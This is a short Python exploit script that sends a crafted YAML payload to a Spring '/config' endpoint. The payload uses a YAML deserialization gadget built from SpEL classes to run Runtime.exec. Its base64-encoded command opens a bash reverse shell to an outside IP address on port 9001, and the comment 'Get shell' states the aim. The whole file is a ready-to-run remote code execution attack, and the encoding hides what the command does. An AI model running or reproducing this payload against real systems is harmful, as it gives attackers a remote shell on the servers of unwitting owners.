import requests

url = "http://127.0.0.1:8081/config"

exp = '''
!!org.springframework.expression.spel.standard.SpelExpression
  - "T(java.lang.Runtime).getRuntime().exec(\\\"bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC84LjE0Mi4xMDQuNzgvOTAwMSAwPiYx}|{base64,-d}|{bash,-i}\\\")"
  - !!org.springframework.expression.spel.ast.CompoundExpression
    - 0
    - 38
    -
      - !!org.springframework.expression.spel.ast.TypeReference
        - 0
        - 1
        - !!org.springframework.expression.spel.ast.QualifiedIdentifier
          - 2
          - 19
          -
            - !!org.springframework.expression.spel.ast.Identifier
              - "java"
              - 2
              - 6
            - !!org.springframework.expression.spel.ast.Identifier
              - "lang"
              - 7
              - 11
            - !!org.springframework.expression.spel.ast.Identifier
              - "Runtime"
              - 12
              - 19
      - !!org.springframework.expression.spel.ast.MethodReference
        - false
        - "getRuntime"
        - 21
        - 31
        -
      - !!org.springframework.expression.spel.ast.MethodReference
        - false
        - "exec"
        - 34
        - 38
        -
          - !!org.springframework.expression.spel.ast.StringLiteral
            - "\\\"bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC84LjE0Mi4xMDQuNzgvOTAwMSAwPiYx}|{base64,-d}|{bash,-i}\\\""
            - 39
            - 134
            - "\\\"bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC84LjE0Mi4xMDQuNzgvOTAwMSAwPiYx}|{base64,-d}|{bash,-i}\\\""
  - !!org.springframework.expression.spel.SpelParserConfiguration 
    - false
    - false
'''

# Get shell
r = requests.post(url, data={
    "yaml": exp
})

print(r.text)
